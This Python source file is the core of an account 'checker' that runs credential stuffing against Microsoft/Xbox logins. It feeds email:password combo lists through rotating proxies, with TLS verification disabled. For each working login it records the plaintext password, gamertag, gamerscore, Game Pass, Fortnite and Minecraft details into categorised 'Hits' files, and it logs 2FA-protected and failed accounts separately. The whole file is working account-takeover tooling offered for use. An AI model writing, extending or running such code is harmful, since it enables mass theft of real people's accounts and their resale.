"""
Core checker — per-worker ClientSession, parallel API calls, full capture.
"""

import asyncio
import aiohttp
import aiofiles
import os
import time
from datetime import datetime
from config import RESULTS_DIR, CAPTURED_BY
from xbox_api import (
    get_live_token, get_user_token, get_xsts,
    get_profile, get_gscore, get_games,
    get_subscriptions, get_mc_java_profile, get_mc_cape_xbox,
)


# ─── Result Writer ────────────────────────────────────────────────────────────
class ResultWriter:
    def __init__(self, session_dir: str, captured_by: str = CAPTURED_BY):
        self.dir        = session_dir
        self.captured_by = captured_by
        self._locks     = {}
        self._counters  = {}
        os.makedirs(session_dir, exist_ok=True)
        self._files = {
            "hits":      os.path.join(session_dir, "Hits.txt"),
            "gscore":    os.path.join(session_dir, "GScore_Hits.txt"),
            "gamepass":  os.path.join(session_dir, "GamePass_Hits.txt"),
            "fortnite":  os.path.join(session_dir, "Fortnite_Hits.txt"),
            "minecraft": os.path.join(session_dir, "Minecraft_Hits.txt"),
            "2fa":       os.path.join(session_dir, "2FA.txt"),
            "bad":       os.path.join(session_dir, "Bad.txt"),
        }
        for key in self._files:
            self._locks[key]   = asyncio.Lock()
            self._counters[key] = 0

    async def _write(self, key: str, content: str):
        async with self._locks[key]:
            self._counters[key] += 1
            async with aiofiles.open(self._files[key], "a", encoding="utf-8") as f:
                await f.write(content)

    def _build_hit_block(self, num: int, email: str, password: str, data: dict) -> str:
        gamertag    = data.get("gamertag", "N/A")
        tier        = data.get("tier", "N/A")
        rep         = data.get("rep", "N/A")
        gscore      = data.get("gscore", 0)
        mc_name     = data.get("mc_name", "N/A")
        mc_uuid     = data.get("mc_uuid", "N/A")
        mc_capes    = data.get("mc_capes", "None")
        hit_type    = data.get("hit_type", "hit")
        subs        = data.get("subs", [])
        games       = data.get("games", [])
        captured_by = self.captured_by

        sub_str = ", ".join(subs) if subs else "None"
        games_str = "\n".join(f"  - {name}: {score}" for name, score in games) if games else "  None"

        block = (
            f"#{num}\n"
            f"Email         : {email}\n"
            f"Password      : {password}\n"
            f"Gamertag      : {gamertag}\n"
            f"Tier          : {tier}\n"
            f"Reputation    : {rep}\n"
            f"Gamerscore    : {gscore}\n"
            f"MC Name       : {mc_name}\n"
            f"UUID          : {mc_uuid}\n"
            f"Capes         : {mc_capes}\n"
            f"Type          : {hit_type}\n"
            f"Subscriptions : {sub_str}\n"
            f"Games G-Score:\n{games_str}\n"
            f"Captured By   : {captured_by}\n"
            f"--------------------------------------------------\n\n"
        )
        return block

    async def write_hit(self, email: str, password: str, data: dict):
        async with self._locks["hits"]:
            self._counters["hits"] += 1
            n = self._counters["hits"]
        block = self._build_hit_block(n, email, password, data)
        # always write to Hits.txt
        await self._write("hits", block)
        # category files
        writes = []
        gscore = data.get("gscore", 0)
        subs   = data.get("subs", [])
        mc     = data.get("mc_name", "N/A")
        games  = data.get("games", [])
        has_fn = any("fortnite" in g[0].lower() for g in games) if games else False

        if gscore > 0:
            writes.append(self._write("gscore", block))
        if subs:
            writes.append(self._write("gamepass", block))
        if has_fn:
            writes.append(self._write("fortnite", block))
        if mc != "N/A":
            writes.append(self._write("minecraft", block))
        if writes:
            await asyncio.gather(*writes)

    async def write_2fa(self, email: str, password: str):
        async with self._locks["2fa"]:
            self._counters["2fa"] += 1
            n = self._counters["2fa"]
        content = f"#{n}\nEmail    : {email}\nPassword : {password}\n--------------------------------------------------\n\n"
        await self._write("2fa", content)

    async def write_bad(self, email: str, password: str):
        async with self._locks["bad"]:
            self._counters["bad"] += 1
        await self._write("bad", f"{email}:{password}\n")

    def get_files(self):
        """Return paths of non-empty result files."""
        out = {}
        for key, path in self._files.items():
            if key == "bad":
                continue
            if os.path.exists(path) and os.path.getsize(path) > 0:
                out[key] = path
        return out

    def write_headers(self, session_name: str, now_str: str):
        """Write header lines to all hit files synchronously before check starts."""
        for key, path in self._files.items():
            if key == "bad":
                continue
            label_map = {
                "hits":      "All Hits",
                "gscore":    "GSCORE Hits",
                "gamepass":  "GamePass Hits",
                "fortnite":  "Fortnite Hits",
                "minecraft": "Minecraft Hits",
                "2fa":       "2FA",
            }
            label = label_map.get(key, key)
            with open(path, "w", encoding="utf-8") as f:
                f.write(
                    f"# {label} - {now_str}\n"
                    f"# Checked by {self.captured_by}\n"
                    f"# Session: {session_name}\n"
                    f"{'='*50}\n\n"
                )


# ─── Single account check ─────────────────────────────────────────────────────
async def check_one(
    email: str, password: str,
    session: aiohttp.ClientSession,
    proxy,
    writer: ResultWriter,
    counters: dict,
    lock: asyncio.Lock,
) -> str:
    """Returns: 'hit' | 'bad' | '2fa' | 'error'"""
    try:
        # Step 1: Live token
        access_token = await get_live_token(session, email, password, proxy)
        if access_token == "proxy_error":
            return "error"
        if access_token == "2fa":
            async with lock:
                counters["2fa"] = counters.get("2fa", 0) + 1
            await writer.write_2fa(email, password)
            return "2fa"
        if not access_token:
            async with lock:
                counters["bad"] = counters.get("bad", 0) + 1
            await writer.write_bad(email, password)
            return "bad"

        # Step 2: Xbox UserToken
        ut_result = await get_user_token(session, access_token, proxy)
        if not ut_result:
            async with lock:
                counters["bad"] = counters.get("bad", 0) + 1
            await writer.write_bad(email, password)
            return "bad"
        user_token, uhs = ut_result

        # Step 3: XSTS
        xsts = await get_xsts(session, user_token, proxy)
        if not xsts:
            async with lock:
                counters["bad"] = counters.get("bad", 0) + 1
            await writer.write_bad(email, password)
            return "bad"

        # Steps 4-7: parallel
        results = await asyncio.gather(
            get_profile(session, xsts, uhs, proxy),
            get_gscore(session, xsts, uhs, proxy),
            get_games(session, xsts, uhs, proxy),
            get_subscriptions(session, xsts, uhs, proxy),
            get_mc_java_profile(session, access_token, proxy),
            return_exceptions=True,
        )

        prof_result, gscore, games, subs, mc_prof = results

        # unpack profile
        if isinstance(prof_result, Exception) or prof_result is None:
            xuid, smap = "N/A", {}
        else:
            xuid, smap = prof_result

        gamertag = smap.get("Gamertag", "N/A")
        tier     = smap.get("AccountTier", "N/A")
        rep      = smap.get("XboxOneRep", "N/A")

        if gamertag == "N/A":
            async with lock:
                counters["bad"] = counters.get("bad", 0) + 1
            await writer.write_bad(email, password)
            return "bad"

        if isinstance(gscore,  Exception): gscore  = 0
        if isinstance(games,   Exception): games   = []
        if isinstance(subs,    Exception): subs    = []
        if isinstance(mc_prof, Exception): mc_prof = None

        mc_name  = mc_prof["name"]  if mc_prof else "N/A"
        mc_uuid  = mc_prof["uuid"]  if mc_prof else "N/A"
        mc_capes = mc_prof["capes"] if mc_prof else "None"

        # Xbox cape fallback
        if mc_capes == "None" and xuid != "N/A":
            has_xbox_cape = await get_mc_cape_xbox(session, xsts, uhs, xuid, proxy)
            if has_xbox_cape:
                mc_capes = "Yes (Xbox)"

        # Determine hit type
        if subs:
            hit_type = "gamepass"
        elif gscore > 0:
            hit_type = "gscore"
        elif mc_name != "N/A":
            hit_type = "minecraft"
        else:
            hit_type = "hit"

        data = {
            "gamertag": gamertag,
            "tier":     tier,
            "rep":      rep,
            "gscore":   gscore,
            "mc_name":  mc_name,
            "mc_uuid":  mc_uuid,
            "mc_capes": mc_capes,
            "hit_type": hit_type,
            "subs":     subs,
            "games":    games,
        }

        async with lock:
            counters["hits"] = counters.get("hits", 0) + 1

        await writer.write_hit(email, password, data)
        return "hit"

    except Exception:
        return "error"


# ─── Worker (owns its own ClientSession) ─────────────────────────────────────
async def _worker(
    queue: asyncio.Queue,
    proxy_mgr,
    writer: ResultWriter,
    counters: dict,
    lock: asyncio.Lock,
    kill_flag: list,
    pause_flag: list,
):
    connector = aiohttp.TCPConnector(
        limit=10, ttl_dns_cache=300,
        force_close=False, ssl=False,
    )
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            if kill_flag[0]:
                break
            while pause_flag[0]:
                if kill_flag[0]:
                    return
                await asyncio.sleep(0.2)
            try:
                email, pw = queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            proxy  = await proxy_mgr.get() if proxy_mgr and proxy_mgr.has_proxies() else None
            result = await check_one(email, pw, session, proxy, writer, counters, lock)

            # retry on proxy error with fresh proxy
            if result == "error" and proxy_mgr and proxy_mgr.has_proxies():
                if proxy:
                    await proxy_mgr.mark_dead(proxy)
                new_proxy = await proxy_mgr.get_fresh()
                if new_proxy and new_proxy != proxy:
                    result2 = await check_one(email, pw, session, new_proxy, writer, counters, lock)
                    if result2 != "error":
                        result = result2
                    else:
                        async with lock:
                            counters["errors"] = counters.get("errors", 0) + 1
                else:
                    async with lock:
                        counters["errors"] = counters.get("errors", 0) + 1
            elif result == "error":
                async with lock:
                    counters["errors"] = counters.get("errors", 0) + 1

            async with lock:
                counters["checked"] = counters.get("checked", 0) + 1

            queue.task_done()


# ─── CPS reporter ─────────────────────────────────────────────────────────────
async def _cps_reporter(counters: dict, lock: asyncio.Lock, kill_flag: list):
    prev     = 0
    ema_cps  = 0.0
    while not kill_flag[0]:
        await asyncio.sleep(1)
        async with lock:
            cur = counters.get("checked", 0)
        instant = cur - prev
        prev    = cur
        ema_cps = 0.3 * instant + 0.7 * ema_cps
        async with lock:
            counters["cps"] = round(ema_cps, 1)


# ─── Main run entry ───────────────────────────────────────────────────────────
async def run_checker(
    combos: list[tuple[str, str]],
    proxy_mgr,
    writer: ResultWriter,
    threads: int,
    kill_flag: list,
    pause_flag: list,
    counters: dict,
):
    lock  = asyncio.Lock()
    queue = asyncio.Queue()
    for pair in combos:
        queue.put_nowait(pair)

    counters.update({"checked": 0, "hits": 0, "bad": 0, "2fa": 0, "errors": 0, "cps": 0})

    workers  = [asyncio.create_task(_worker(queue, proxy_mgr, writer, counters, lock, kill_flag, pause_flag))
                for _ in range(min(threads, len(combos)))]
    reporter = asyncio.create_task(_cps_reporter(counters, lock, kill_flag))

    await queue.join()
    kill_flag[0] = True
    reporter.cancel()
    await asyncio.gather(*workers, return_exceptions=True)
